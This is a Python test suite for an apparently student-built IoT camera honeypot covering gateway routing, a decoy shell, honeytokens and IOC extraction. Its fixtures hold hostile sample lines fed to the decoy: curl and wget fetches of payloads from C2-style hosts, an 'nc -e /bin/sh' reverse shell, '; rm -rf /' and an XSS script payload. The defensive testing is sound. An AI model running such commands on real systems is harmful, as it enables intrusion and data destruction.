"""
AegisMirage — Person B Test Suite & Integration Fixtures.

Comprehensive verification of:
1. gateway.py:
   - Configurable scoring and threshold boundaries (real < 20, rate_limit 20-59.9, decoy >= 60).
   - Allowlisting routes to real path without bypassing real-device authentication.
   - Uncertain cases fail-safe to rate_limit.
   - Sticky decisions persist across connections; new evidence causes escalation.
   - Bounded per-source state and TTL expiration.
   - Transport-observed source extraction vs. forged header rejection.
   - Decision computation vs. actual handler enforcement and handler injection.
2. decoy.py:
   - In-memory virtual filesystem navigation and reading.
   - Honeytokens at multiple depths triggering high-confidence flags and Rickroll response.
   - IOC extraction for malware hashes (SHA-256/MD5) and C2 addresses/URLs.
   - Schema compliance with schema.py models (RouteDecision, DecoySessionEvent).
3. Explicit test fixtures for missing teammates' functionality:
   - MockMemberAEdgeMesh (simulates camera network probes).
   - MockMemberCIntelCluster (verifies Stage 3 clustering contract inputs).
"""

import asyncio
import base64
import hashlib
import unittest
from typing import Any, Dict, List

from fastapi.testclient import TestClient

import schema
import gateway
import decoy
import dev_harness


# =============================================================================
# Explicit Test Fixtures for Teammates' Functionality
# =============================================================================

class MockMemberAEdgeMesh:
    """
    Test fixture simulating Member A's edge camera mesh.
    Generates synthetic connection attempts from camera field networks.
    """

    def generate_benign_operator_probe(self) -> dict:
        return {
            "source_ip": "127.0.0.1",
            "service": "ssh",
            "creds": ("operator", "ValidOperatorPass2026!"),
            "is_failure": False,
        }

    def generate_scanner_probe(self) -> dict:
        return {
            "source_ip": "194.26.29.50",
            "service": "web",
            "creds": ("admin", "admin"),
            "is_failure": True,
        }

    def generate_anomalous_probe(self) -> dict:
        return {
            "source_ip": "198.51.100.88",
            "service": "rtsp",
            "creds": None,
            "is_failure": False,
        }


class MockMemberCIntelCluster:
    """
    Test fixture simulating Member C's campaign clustering engine.
    Verifies that DecoySessionEvent instances from Person B supply the
    exact required attributes for Stage 3 graph clustering.
    """

    def verify_session_clustering_inputs(self, event: schema.DecoySessionEvent) -> bool:
        assert isinstance(event.session_id, str) and event.session_id
        assert isinstance(event.source_ip, str) and event.source_ip
        assert isinstance(event.service, str) and event.service
        assert isinstance(event.failed_logins, int)
        assert isinstance(event.commands, list)
        assert isinstance(event.honeytoken_hit, bool)
        assert event.malware_hash is None or isinstance(event.malware_hash, str)
        assert event.c2_address is None or isinstance(event.c2_address, str)
        return True


# =============================================================================
# Unit Tests: Gateway Routing (gateway.py)
# =============================================================================

class TestGatewayRouting(unittest.TestCase):

    def setUp(self) -> None:
        gateway.reset_gateway()

    # -------------------------------------------------------------------------
    # Threshold Boundaries
    # -------------------------------------------------------------------------

    def test_threshold_boundary_low_to_real(self) -> None:
        """Score < 20.0 must route to 'real' with low risk explanation."""
        # Single failed login is 15.0 pts (< 20.0)
        decision = gateway.evaluate_route("192.168.1.105", service="web", is_login_failure=True)
        self.assertEqual(decision.destination, "real")
        self.assertEqual(decision.score, 15.0)
        self.assertIn("low risk", decision.reason.lower())

    def test_threshold_boundary_exact_rate_limit(self) -> None:
        """Exact boundary score of 20.0 to 59.9 must trigger fail-safe 'rate_limit'."""
        # Custom config with exact threshold to test boundary
        cfg = gateway.GatewayConfig(
            failed_login_penalty=20.0,
            threshold_real_max=20.0,
            threshold_decoy_min=60.0,
        )
        router = gateway.GatewayRouter(config=cfg)
        decision = router.compute_route_decision("198.51.100.1", service="web", is_login_failure=True)
        self.assertEqual(decision.score, 20.0)
        self.assertEqual(decision.destination, "rate_limit")
        self.assertIn("fail-safe rate limit", decision.reason.lower())

    def test_threshold_boundary_upper_rate_limit(self) -> None:
        """Score just under 60.0 (e.g. 55.0) remains fail-safe 'rate_limit'."""
        cfg = gateway.GatewayConfig(
            failed_login_penalty=55.0,
            threshold_real_max=20.0,
            threshold_decoy_min=60.0,
        )
        router = gateway.GatewayRouter(config=cfg)
        decision = router.compute_route_decision("198.51.100.2", service="web", is_login_failure=True)
        self.assertEqual(decision.score, 55.0)
        self.assertEqual(decision.destination, "rate_limit")

    def test_threshold_boundary_exact_decoy(self) -> None:
        """Score exactly 60.0 or higher routes to 'decoy'."""
        cfg = gateway.GatewayConfig(
            default_creds_penalty=60.0,
            threshold_real_max=20.0,
            threshold_decoy_min=60.0,
        )
        router = gateway.GatewayRouter(config=cfg)
        decision = router.compute_route_decision(
            "203.0.113.1",
            service="ssh",
            attempted_creds=("admin", "admin"),
        )
        self.assertEqual(decision.score, 60.0)
        self.assertEqual(decision.destination, "decoy")
        self.assertIn("hostile threshold", decision.reason.lower())

    # -------------------------------------------------------------------------
    # Allowlisting & Auth Non-Bypass
    # -------------------------------------------------------------------------

    def test_allowlisting_routes_to_real_without_auth_bypass(self) -> None:
        """
        Allowlisted IPs route to 'real', but allowlisting only affects routing.
        It must not bypass real-device authentication.
        """
        decision = gateway.evaluate_route("127.0.0.1", service="ssh")
        self.assertEqual(decision.destination, "real")
        self.assertEqual(decision.score, 0.0)
        self.assertIn("allowlist", decision.reason.lower())
        self.assertIn("requires valid auth", decision.reason.lower())

        # Enforce through handler and verify that real device handler receives the context
        enforced = gateway.handle_request("127.0.0.1", service="ssh", context={"auth_token": None})
        self.assertEqual(enforced["selected_handler"], "real_handler")
        # Real handler processed context; token is still None (no artificial auth bypass)
        self.assertIsNone(enforced["handler_result"]["context"]["auth_token"])

    # -------------------------------------------------------------------------
    # Uncertain Cases Fail-Safe
    # -------------------------------------------------------------------------

    def test_uncertain_reconnaissance_failsafe_rate_limit(self) -> None:
        """Uncertain reconnaissance triggers fail-safe 'rate_limit', never silently decoying."""
        # Touch 1: web service (0 pts)
        gateway.evaluate_route("198.51.100.20", service="web")
        # Touch 2: multi-service probe with single failed login (15 + 15 = 30 pts in [20, 60))
        decision = gateway.evaluate_route("198.51.100.20", service="ssh", is_login_failure=True)
        self.assertEqual(decision.destination, "rate_limit")
        self.assertTrue(20.0 <= decision.score < 60.0)

    # -------------------------------------------------------------------------
    # Sticky Decisions & Escalation
    # -------------------------------------------------------------------------

    def test_sticky_routing_locks_decoy(self) -> None:
        """Once an attacker is trapped in decoy, subsequent probes stay sticky to decoy."""
        first = gateway.evaluate_route(
            "185.220.101.9",
            service="ssh",
            attempted_creds=("root", "123456"),
            is_login_failure=True,
        )
        self.assertEqual(first.destination, "decoy")

        # Second probe without creds from the same IP remains sticky to decoy
        second = gateway.evaluate_route("185.220.101.9", service="web")
        self.assertEqual(second.destination, "decoy")
        self.assertIn("Sticky", second.reason)

    def test_escalation_from_rate_limit_to_decoy_on_new_evidence(self) -> None:
        """New evidence on subsequent connections can escalate rate-limited hosts to decoy."""
        # Probe 1: rate-limited reconnaissance
        gateway.evaluate_route("198.51.100.77", service="web")
        p1 = gateway.evaluate_route("198.51.100.77", service="ssh", is_login_failure=True)
        self.assertEqual(p1.destination, "rate_limit")

        # Probe 2: host attempts Mirai default credentials -> score jumps >= 60 -> escalates to decoy!
        p2 = gateway.evaluate_route(
            "198.51.100.77",
            service="ssh",
            attempted_creds=("admin", "admin"),
            is_login_failure=True,
        )
        self.assertEqual(p2.destination, "decoy")
        self.assertIn("Escalated from rate_limit to decoy", p2.reason)

    # -------------------------------------------------------------------------
    # Bounded State & Expiry (TTL)
    # -------------------------------------------------------------------------

    def test_source_expiry_after_ttl(self) -> None:
        """State resets after session_ttl_seconds has passed."""
        router = gateway.GatewayRouter(
            config=gateway.GatewayConfig(session_ttl_seconds=60.0)
        )
        t0 = 1000.0

        # Initial probe: Mirai credentials -> score 65 -> decoy
        d1 = router.compute_route_decision(
            "203.0.113.99",
            attempted_creds=("admin", "admin"),
            is_login_failure=True,
            now=t0,
        )
        self.assertEqual(d1.destination, "decoy")
        self.assertEqual(d1.score, 65.0)

        # Probe within TTL: remains sticky to decoy
        d2 = router.compute_route_decision("203.0.113.99", service="web", now=t0 + 30.0)
        self.assertEqual(d2.destination, "decoy")

        # Probe after TTL has expired (> 60s inactivity) -> state re-initialized
        t_expired = t0 + 100.0
        d3 = router.compute_route_decision("203.0.113.99", service="web", now=t_expired)
        self.assertEqual(d3.destination, "real")
        self.assertEqual(d3.score, 0.0)

    def test_bounded_state_eviction_on_capacity(self) -> None:
        """Router bounds memory by evicting oldest records when max_tracked_sources is reached."""
        router = gateway.GatewayRouter(
            config=gateway.GatewayConfig(max_tracked_sources=3, session_ttl_seconds=1000.0)
        )
        router.compute_route_decision("10.0.0.1", now=10.0)
        router.compute_route_decision("10.0.0.2", now=20.0)
        router.compute_route_decision("10.0.0.3", now=30.0)
        self.assertEqual(len(router.sources), 3)

        # Adding 4th IP forces eviction of 10.0.0.1 (oldest last_seen)
        router.compute_route_decision("10.0.0.4", now=40.0)
        self.assertEqual(len(router.sources), 3)
        self.assertNotIn("10.0.0.1", router.sources)
        self.assertIn("10.0.0.4", router.sources)

    # -------------------------------------------------------------------------
    # Forged Source Inputs & Transport Extraction
    # -------------------------------------------------------------------------

    def test_forged_forwarded_headers_rejected_by_default(self) -> None:
        """Client-provided X-Forwarded-For is untrusted and ignored by default."""
        router = gateway.GatewayRouter()  # trust_forwarded_headers=False
        actual_peer = "198.51.100.5"
        spoofed_header = "127.0.0.1, 10.0.0.1"

        extracted = router.extract_source_ip(
            transport_peer_ip=actual_peer,
            forwarded_header=spoofed_header,
        )
        self.assertEqual(extracted, actual_peer)
        self.assertNotEqual(extracted, "127.0.0.1")

    def test_trusted_forwarded_headers_when_configured(self) -> None:
        """When explicitly configured behind a trusted proxy, forwarded header is parsed."""
        cfg = gateway.GatewayConfig(trust_forwarded_headers=True)
        router = gateway.GatewayRouter(config=cfg)
        actual_peer = "10.0.0.2"
        spoofed_header = "203.0.113.50, 10.0.0.2"

        extracted = router.extract_source_ip(
            transport_peer_ip=actual_peer,
            forwarded_header=spoofed_header,
        )
        self.assertEqual(extracted, "203.0.113.50")

    # -------------------------------------------------------------------------
    # Decision vs. Enforcement & Handler Selection
    # -------------------------------------------------------------------------

    def test_enforce_route_selects_expected_handlers(self) -> None:
        """Enforcing RouteDecision triggers the specific registered handler."""
        # 1. Real destination
        dec_real = schema.RouteDecision(source_ip="127.0.0.1", destination="real", score=0.0, reason="test")
        res_real = gateway.enforce_route(dec_real)
        self.assertEqual(res_real["selected_handler"], "real_handler")
        self.assertEqual(res_real["handler_result"]["status"], "PASS_THROUGH_DELIVERED")

        # 2. Decoy destination
        dec_decoy = schema.RouteDecision(source_ip="203.0.113.1", destination="decoy", score=80.0, reason="test")
        res_decoy = gateway.enforce_route(dec_decoy)
        self.assertEqual(res_decoy["selected_handler"], "decoy_handler")
        self.assertEqual(res_decoy["handler_result"]["status"], "TRAPPED_IN_DECOY")

        # 3. Rate-limit destination
        dec_limit = schema.RouteDecision(source_ip="198.51.100.1", destination="rate_limit", score=30.0, reason="test")
        res_limit = gateway.enforce_route(dec_limit)
        self.assertEqual(res_limit["selected_handler"], "rate_limit_handler")
        self.assertEqual(res_limit["handler_result"]["status"], "THROTTLED_429")

    def test_custom_handler_injection(self) -> None:
        """Custom handler functions can be injected for real and decoy dispatch."""
        custom_called = []

        def my_real_handler(ctx: Dict[str, Any]) -> str:
            custom_called.append(ctx["source_ip"])
            return "CUSTOM_REAL_CALLED"

        gateway.set_real_device_handler(my_real_handler)
        result = gateway.handle_request("127.0.0.1", service="web")
        self.assertEqual(result["handler_result"], "CUSTOM_REAL_CALLED")
        self.assertIn("127.0.0.1", custom_called)


# =============================================================================
# Unit Tests: Decoy Honeypot (decoy.py)
# =============================================================================

class TestDecoyHoneypot(unittest.TestCase):

    def setUp(self) -> None:
        decoy.reset_decoy_state()

    def test_session_lifecycle_and_commands(self) -> None:
        """Decoy properly runs shell commands and tracks command history."""
        sid = "sess-test-01"
        out_pwd, ev = decoy.execute_decoy_command(sid, "pwd")
        self.assertIn("/", out_pwd)
        self.assertEqual(ev.commands, ["pwd"])

        out_whoami, ev = decoy.execute_decoy_command(sid, "whoami")
        self.assertIn("root", out_whoami)
        self.assertEqual(ev.commands, ["pwd", "whoami"])

    def test_filesystem_navigation(self) -> None:
        """Attacker can cd into directories and ls contents."""
        sid = "sess-test-nav"
        decoy.execute_decoy_command(sid, "cd /etc/camera")
        out_pwd, _ = decoy.execute_decoy_command(sid, "pwd")
        self.assertEqual(out_pwd.strip(), "/etc/camera")

        out_ls, _ = decoy.execute_decoy_command(sid, "ls")
        self.assertIn("credentials.conf", out_ls)

    def test_honeytoken_trip_and_rickroll(self) -> None:
        """Accessing a honeytoken bait file sets honeytoken_hit=True and returns Rickroll."""
        sid = "sess-test-bait"
        _, ev_before = decoy.execute_decoy_command(sid, "ls /etc/camera")
        self.assertFalse(ev_before.honeytoken_hit)

        out_cat, ev_after = decoy.execute_decoy_command(sid, "cat /etc/camera/credentials.conf")
        self.assertTrue(ev_after.honeytoken_hit)
        self.assertIn("NEVER GONNA GIVE YOU UP", out_cat)
        self.assertIn("HONEYTOKEN COMPROMISE DETECTED", out_cat)

    def test_additional_honeytoken_depths(self) -> None:
        """Honeytokens at /root/keys/vault_token.key and /var/backup/firmware_pass.enc also trip."""
        sid = "sess-test-depth3"
        out1, ev1 = decoy.execute_decoy_command(sid, "cat /root/keys/vault_token.key")
        self.assertTrue(ev1.honeytoken_hit)
        self.assertIn("NEVER GONNA GIVE YOU UP", out1)

        sid2 = "sess-test-depth3-b"
        out2, ev2 = decoy.execute_decoy_command(sid2, "cat /var/backup/firmware_pass.enc")
        self.assertTrue(ev2.honeytoken_hit)
        self.assertIn("NEVER GONNA GIVE YOU UP", out2)

    def test_ioc_extraction(self) -> None:
        """Regex IOC extractor extracts SHA-256/MD5 hashes and C2 addresses."""
        sid = "sess-test-ioc"
        cmd = "wget http://194.26.29.112:8080/stage2.sh -O /tmp/x && sha256sum e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        _, ev = decoy.execute_decoy_command(sid, cmd)
        self.assertEqual(ev.c2_address, "http://194.26.29.112:8080/stage2.sh")
        self.assertEqual(ev.malware_hash, "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855")

    def test_schema_compliance_with_member_c_fixture(self) -> None:
        """DecoySessionEvent validates against Member C's clustering fixture."""
        sid = "sess-contract-test"
        decoy.record_decoy_login(sid, "192.0.2.10", "ssh", "admin", "1234", success=False)
        decoy.execute_decoy_command(sid, "curl http://c2.badbot.cc:9000/bot.bin")
        decoy.execute_decoy_command(sid, "cat /etc/camera/credentials.conf")

        ev = decoy.get_session_by_id(sid)
        self.assertIsNotNone(ev)
        fixture = MockMemberCIntelCluster()
        self.assertTrue(fixture.verify_session_clustering_inputs(ev))

    def test_directory_traversal_protection(self) -> None:
        """Attacker cannot escape virtual filesystem root (/) via traversal paths."""
        sid = "sess-traversal-test"

        # Try traversing up past root
        decoy.execute_decoy_command(sid, "cd ../../../../../..")
        out_pwd, _ = decoy.execute_decoy_command(sid, "pwd")
        self.assertEqual(out_pwd.strip(), "/")

        # Try relative traversal from nested directory
        decoy.execute_decoy_command(sid, "cd /etc/camera")
        decoy.execute_decoy_command(sid, "cd ../../../../../root")
        out_pwd2, _ = decoy.execute_decoy_command(sid, "pwd")
        self.assertEqual(out_pwd2.strip(), "/root")

        # Try reading file with traversal in cat
        out_cat, _ = decoy.execute_decoy_command(sid, "cat ../../../../../../etc/passwd")
        self.assertIn("root:x:0:0", out_cat)

    def test_command_injection_and_metacharacters_no_host_execution(self) -> None:
        """Metacharacters (; | & ` $ ()) are never passed to any host shell or subprocess."""
        sid = "sess-injection-test"
        # Semicolon injection
        out1, ev1 = decoy.execute_decoy_command(sid, "; rm -rf /")
        self.assertIn("command not found", out1)
        self.assertEqual(ev1.commands[-1], "; rm -rf /")

        # Pipe injection: command does NOT pipe to host subprocess
        out2, _ = decoy.execute_decoy_command(sid, "cat /etc/passwd | id")
        self.assertNotIn("uid=", out2)
        self.assertIn("root:x:0:0", out2)

        # Backtick / subshell injection
        out3, _ = decoy.execute_decoy_command(sid, "`whoami`")
        self.assertIn("command not found", out3)

    def test_session_isolation(self) -> None:
        """Different sessions maintain completely isolated directories and state."""
        sid_a = "sess-iso-a"
        sid_b = "sess-iso-b"

        decoy.execute_decoy_command(sid_a, "cd /etc/camera")
        decoy.execute_decoy_command(sid_b, "cd /root")

        out_a, ev_a = decoy.execute_decoy_command(sid_a, "pwd")
        out_b, ev_b = decoy.execute_decoy_command(sid_b, "pwd")

        self.assertEqual(out_a.strip(), "/etc/camera")
        self.assertEqual(out_b.strip(), "/root")
        self.assertEqual(ev_a.commands, ["cd /etc/camera", "pwd"])
        self.assertEqual(ev_b.commands, ["cd /root", "pwd"])

    def test_session_event_callback_delivery(self) -> None:
        """Registered listeners (e.g. Person C intel.py) receive event notifications on state changes."""
        received: List[schema.DecoySessionEvent] = []

        def on_event(evt: schema.DecoySessionEvent) -> None:
            received.append(evt)

        decoy.register_session_listener(on_event)
        try:
            sid = "sess-pubsub-test"
            # 1. Login attempt triggers event
            decoy.record_decoy_login(sid, "198.51.100.9", "ssh", "admin", "pass123", success=False)
            self.assertEqual(len(received), 1)
            self.assertEqual(received[-1].failed_logins, 1)

            # 2. Command execution triggers event
            decoy.execute_decoy_command(sid, "pwd")
            self.assertEqual(len(received), 2)
            self.assertEqual(received[-1].commands, ["pwd"])

            # 3. Disconnect triggers event
            final_ev = decoy.end_decoy_session(sid)
            self.assertEqual(len(received), 3)
            self.assertEqual(final_ev.session_id, sid)
        finally:
            decoy.unregister_session_listener(on_event)

    def test_safe_credential_logging_no_raw_passwords(self) -> None:
        """Raw passwords are never stored in session telemetry or event objects."""
        sid = "sess-safe-test"
        raw_password = "SuperSecretPlainTextPassword123!"
        ev = decoy.record_decoy_login(sid, "192.0.2.5", "ssh", "admin", raw_password, success=False)

        # Confirm raw password does not appear in any attribute or string representation
        self.assertNotIn(raw_password, str(ev.model_dump()))
        # Confirm masked sha256 fingerprint representation is present
        fingerprint = decoy.safe_credential_summary(raw_password)
        self.assertTrue(fingerprint.startswith("masked:"))
        self.assertIn("sha256:", fingerprint)

    def test_clean_startup_shutdown_lifecycle(self) -> None:
        """Explicit async startup and shutdown hooks execute cleanly without exceptions."""
        loop = asyncio.new_event_loop()
        try:
            loop.run_until_complete(decoy.startup(start_ssh=False))
            loop.run_until_complete(decoy.shutdown())
        finally:
            loop.close()

    def test_multi_depth_honeytoken_access(self) -> None:
        """
        Tests access to planted honeytoken bait files across all depth levels:
        Depth 1: /emergency_token.cfg
        Depth 2: /etc/camera/credentials.conf
        Depth 3: /root/keys/vault_token.key
        Depth 3: /var/backup/firmware_pass.enc
        Depth 3: /home/operator/.aws_keys
        All read operations (cat, head, tail, more, less) trigger honeytoken_hit=True
        and return the sandboxed Rickroll response payload.
        """
        # Depth 1: /emergency_token.cfg via cat
        out1, ev1 = decoy.execute_decoy_command("sess-d1", "cat /emergency_token.cfg")
        self.assertTrue(ev1.honeytoken_hit)
        self.assertIn("NEVER GONNA GIVE YOU UP", out1)
        self.assertIn("HONEYTOKEN COMPROMISE DETECTED", out1)

        # Depth 2: /etc/camera/credentials.conf via head
        out2, ev2 = decoy.execute_decoy_command("sess-d2", "head /etc/camera/credentials.conf")
        self.assertTrue(ev2.honeytoken_hit)
        self.assertIn("NEVER GONNA GIVE YOU UP", out2)

        # Depth 3: /root/keys/vault_token.key via more
        out3, ev3 = decoy.execute_decoy_command("sess-d3a", "more /root/keys/vault_token.key")
        self.assertTrue(ev3.honeytoken_hit)
        self.assertIn("NEVER GONNA GIVE YOU UP", out3)

        # Depth 3: /var/backup/firmware_pass.enc via tail
        out4, ev4 = decoy.execute_decoy_command("sess-d3b", "tail /var/backup/firmware_pass.enc")
        self.assertTrue(ev4.honeytoken_hit)
        self.assertIn("NEVER GONNA GIVE YOU UP", out4)

        # Depth 3: /home/operator/.aws_keys via less
        out5, ev5 = decoy.execute_decoy_command("sess-d3c", "less /home/operator/.aws_keys")
        self.assertTrue(ev5.honeytoken_hit)
        self.assertIn("NEVER GONNA GIVE YOU UP", out5)

    def test_ls_does_not_trigger_honeytoken(self) -> None:
        """
        Directory listing (ls) and statting files must NOT trigger honeytoken_hit.
        Only explicit read operations (cat, head, tail, etc.) trigger detection.
        """
        sid = "sess-ls-not-trigger"
        out_root, ev_root = decoy.execute_decoy_command(sid, "ls /")
        self.assertIn("emergency_token.cfg", out_root)
        self.assertFalse(ev_root.honeytoken_hit, "ls / must not trigger honeytoken")

        out_etc, ev_etc = decoy.execute_decoy_command(sid, "ls /etc/camera")
        self.assertIn("credentials.conf", out_etc)
        self.assertFalse(ev_etc.honeytoken_hit, "ls /etc/camera must not trigger honeytoken")

        out_file, ev_file = decoy.execute_decoy_command(sid, "ls /emergency_token.cfg")
        self.assertIn("emergency_token.cfg", out_file)
        self.assertFalse(ev_file.honeytoken_hit, "ls /emergency_token.cfg must not trigger honeytoken")

    def test_repeated_bait_access(self) -> None:
        """
        Repeated access to bait files remains idempotent, bounded, and safe.
        No state corruption or unhandled errors.
        """
        sid = "sess-repeated-bait"
        for _ in range(5):
            out, ev = decoy.execute_decoy_command(sid, "cat /emergency_token.cfg")
            self.assertTrue(ev.honeytoken_hit)
            self.assertIn("NEVER GONNA GIVE YOU UP", out)

    def test_file_submission_evidence_and_hashes(self) -> None:
        """
        Bounded file evidence submission:
        - SHA-256 computed from actual received file bytes.
        - Stored in quarantine directory outside web root with generated random filename.
        - Populates malware_hash field in DecoySessionEvent.
        """
        sid = "sess-evidence-hash"
        test_bytes = b"echo 'testing payload 12345'; exit 0;\n"
        expected_sha256 = hashlib.sha256(test_bytes).hexdigest()
        expected_md5 = hashlib.md5(test_bytes).hexdigest()

        rec, ev = decoy.submit_file_evidence(
            session_id=sid,
            original_filename="test_script.sh",
            file_bytes=test_bytes,
            source_ip="198.51.100.42",
        )
        self.assertEqual(rec.sha256, expected_sha256)
        self.assertEqual(rec.md5, expected_md5)
        self.assertEqual(rec.size_bytes, len(test_bytes))
        self.assertEqual(rec.original_filename, "test_script.sh")
        self.assertTrue(rec.quarantine_filename.startswith("artifact_"))
        self.assertTrue(rec.quarantine_filename.endswith(".bin"))

        # Verify file exists on disk in quarantine
        q_dir = decoy.get_quarantine_dir()
        q_file = q_dir / rec.quarantine_filename
        self.assertTrue(q_file.exists())
        self.assertEqual(q_file.read_bytes(), test_bytes)

        # Verify session event populated
        self.assertEqual(ev.malware_hash, expected_sha256)

    def test_static_ioc_extraction_from_bytes(self) -> None:
        """
        Statically extracts potential URLs, IPs, and C2 candidates from uploaded bytes.
        Never executes files or contacts extracted destinations.
        """
        sid = "sess-ioc-extract"
        script_data = (
            b"#!/bin/bash\n"
            b"curl -s http://attacker-c2.example.com:8443/payload.bin -o /tmp/p\n"
            b"wget https://backup-mirai.net/dropper -O /tmp/d\n"
            b"nc -e /bin/sh 198.51.100.99 4444\n"
        )
        rec, ev = decoy.submit_file_evidence(
            session_id=sid,
            original_filename="dropper.sh",
            file_bytes=script_data,
        )
        self.assertIn("http://attacker-c2.example.com:8443/payload.bin", rec.candidate_urls)
        self.assertIn("https://backup-mirai.net/dropper", rec.candidate_urls)
        # Check candidate C2 selection priority (URL with port takes precedence)
        self.assertEqual(ev.c2_address, "http://attacker-c2.example.com:8443/payload.bin")

    def test_oversized_upload_rejected(self) -> None:
        """Uploads exceeding MAX_UPLOAD_SIZE_BYTES (2MB) must be rejected with ValueError."""
        sid = "sess-oversized"
        oversized = b"X" * (decoy.MAX_UPLOAD_SIZE_BYTES + 1024)
        with self.assertRaises(ValueError):
            decoy.submit_file_evidence(
                session_id=sid,
                original_filename="huge_blob.bin",
                file_bytes=oversized,
            )

    def test_malformed_and_binary_uploads(self) -> None:
        """Binary files and null bytes are handled safely without decoding errors."""
        sid = "sess-binary-upload"
        binary_blob = bytes([i % 256 for i in range(2048)])
        expected_sha = hashlib.sha256(binary_blob).hexdigest()

        rec, ev = decoy.submit_file_evidence(
            session_id=sid,
            original_filename="binary.raw",
            file_bytes=binary_blob,
        )
        self.assertEqual(rec.sha256, expected_sha)
        self.assertEqual(rec.size_bytes, 2048)
        self.assertEqual(ev.malware_hash, expected_sha)

    def test_separate_tracking_referenced_urls_and_uploads(self) -> None:
        """
        Referenced URLs and target filenames from command executions are tracked
        separately from actual uploaded file evidence.
        """
        sid = "sess-separate-tracking"
        # 1. Shell command referencing URL and output path
        decoy.execute_decoy_command(sid, "wget http://recon-scanner.org/list.txt -O /tmp/recon.txt")
        
        prov_before = decoy.get_session_provenance(sid)
        self.assertIn("http://recon-scanner.org/list.txt", prov_before["referenced_urls"])
        self.assertIn("/tmp/recon.txt", prov_before["referenced_files"])
        self.assertEqual(len(prov_before["file_submissions"]), 0)

        # 2. Upload actual file
        decoy.submit_file_evidence(sid, "real_payload.sh", b"echo 'uploaded bytes'\n")
        prov_after = decoy.get_session_provenance(sid)
        self.assertEqual(len(prov_after["file_submissions"]), 1)
        self.assertEqual(prov_after["file_submissions"][0]["original_filename"], "real_payload.sh")

    def test_deterministic_selection_policy(self) -> None:
        """
        When multiple indicators exist, deterministic selection policy is enforced:
        - malware_hash: File submission SHA-256 > command line SHA-256.
        - c2_address: File submission URL with port > plain URL > command line URL.
        """
        sid = "sess-deterministic-policy"
        # Command line has a hash and URL
        cmd_hash = "1111111111111111111111111111111111111111111111111111111111111111"
        decoy.execute_decoy_command(sid, f"curl http://cmd-c2.org/script.sh && echo {cmd_hash}")
        
        ev_cmd = decoy.get_session_by_id(sid)
        self.assertEqual(ev_cmd.malware_hash, cmd_hash)
        self.assertEqual(ev_cmd.c2_address, "http://cmd-c2.org/script.sh")

        # Now submit file evidence with distinct hash and C2 with port
        file_bytes = b"http://file-c2.org:8080/bot\n"
        file_sha = hashlib.sha256(file_bytes).hexdigest()
        _, ev_file = decoy.submit_file_evidence(sid, "file.sh", file_bytes)

        # File submission takes priority over command line for single-slot fields
        self.assertEqual(ev_file.malware_hash, file_sha)
        self.assertEqual(ev_file.c2_address, "http://file-c2.org:8080/bot")

    def test_provenance_summary_and_epistemic_disclaimer(self) -> None:
        """
        Local provenance report retains full multi-indicator evidence and epistemic disclaimers:
        - malware_hash is a digest, not proof of malice.
        - c2_address is a candidate indicator, not confirmed C2.
        - honeytoken_hit is an observed interaction, not legal guilt.
        """
        sid = "sess-provenance-audit"
        decoy.execute_decoy_command(sid, "cat /emergency_token.cfg")
        decoy.submit_file_evidence(sid, "test.bin", b"some binary data\n")

        prov = decoy.get_session_provenance(sid)
        self.assertIsNotNone(prov)
        self.assertTrue(prov["honeytoken_hit"])
        self.assertEqual(prov["file_submissions_count"], 1)
        self.assertIn("epistemic_disclaimer", prov)
        self.assertIn("not proof of malice", prov["epistemic_disclaimer"].lower())
        self.assertIn("not verified c2 infrastructure", prov["epistemic_disclaimer"].lower())
        self.assertIn("not proof of individual human identity", prov["epistemic_disclaimer"].lower())


# =============================================================================
# Integration Tests: Web Decoy & Dev Harness
# =============================================================================

class TestWebDecoyAndHarness(unittest.TestCase):
    """Verifies fake camera web routes and gateway APIs using TestClient."""

    @classmethod
    def setUpClass(cls) -> None:
        cls.client = TestClient(dev_harness.app)

    def setUp(self) -> None:
        decoy.reset_decoy_state()
        gateway.reset_gateway()

    def test_health_check(self) -> None:
        """Harness health endpoint returns ok."""
        res = self.client.get("/health")
        self.assertEqual(res.status_code, 200)
        self.assertEqual(res.json()["status"], "ok")
        self.assertEqual(res.json()["owner"], "Member B")

    def test_web_decoy_login_get_page(self) -> None:
        """Fake camera login page is served with HTML content."""
        res = self.client.get("/api/decoy/web/login")
        self.assertEqual(res.status_code, 200)
        self.assertIn("AegisCam Portal", res.text)
        self.assertIn("cam-smart-04", res.text)

    def test_web_decoy_xss_escaping(self) -> None:
        """Untrusted web query parameters are strictly escaped in HTML output."""
        xss_payload = "<script>alert('XSS')</script>"
        res = self.client.get(f"/api/decoy/web/login?error={xss_payload}&user={xss_payload}")
        self.assertEqual(res.status_code, 200)
        # Raw unescaped script tag MUST NOT appear
        self.assertNotIn("<script>alert('XSS')</script>", res.text)
        # Escaped entity MUST appear
        self.assertIn("&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;", res.text)

    def test_web_decoy_invalid_login_returns_401(self) -> None:
        """Invalid credentials return 401 with escaped error message."""
        res = self.client.post(
            "/api/decoy/web/login",
            data={"username": "malicious_user", "password": "wrong_password_999"},
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )
        self.assertEqual(res.status_code, 401)
        self.assertIn("Invalid credentials for user &#x27;malicious_user&#x27;", res.text)

        # Check telemetry recorded failure
        sessions = decoy.get_active_sessions()
        self.assertTrue(len(sessions) > 0)
        self.assertEqual(sessions[0].failed_logins, 1)

    def test_web_decoy_valid_login_renders_device_page(self) -> None:
        """Demo credentials render the camera device control view."""
        res = self.client.post(
            "/api/decoy/web/login",
            data={"username": "admin", "password": "admin"},
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )
        self.assertEqual(res.status_code, 200)
        self.assertIn("AegisCam — Device Control", res.text)
        self.assertIn("LIVE 1080p 30fps", res.text)
        self.assertIn("rtsp://127.0.0.1:554/live/ch0", res.text)

    def test_gateway_route_and_decisions_api(self) -> None:
        """Gateway router API endpoints compute and return RouteDecisions."""
        # Post route evaluation
        req_data = {
            "source_ip": "203.0.113.77",
            "service": "ssh",
            "username": "root",
            "password": "root",
            "is_login_failure": True,
        }
        res_post = self.client.post("/api/gateway/route", json=req_data)
        self.assertEqual(res_post.status_code, 200)
        decision = res_post.json()
        self.assertEqual(decision["source_ip"], "203.0.113.77")
        self.assertIn("destination", decision)

        # Get decisions history
        res_get = self.client.get("/api/gateway/decisions")
        self.assertEqual(res_get.status_code, 200)
        self.assertTrue(len(res_get.json()) >= 1)

        # Get summary
        res_sum = self.client.get("/api/gateway/summary")
        self.assertEqual(res_sum.status_code, 200)
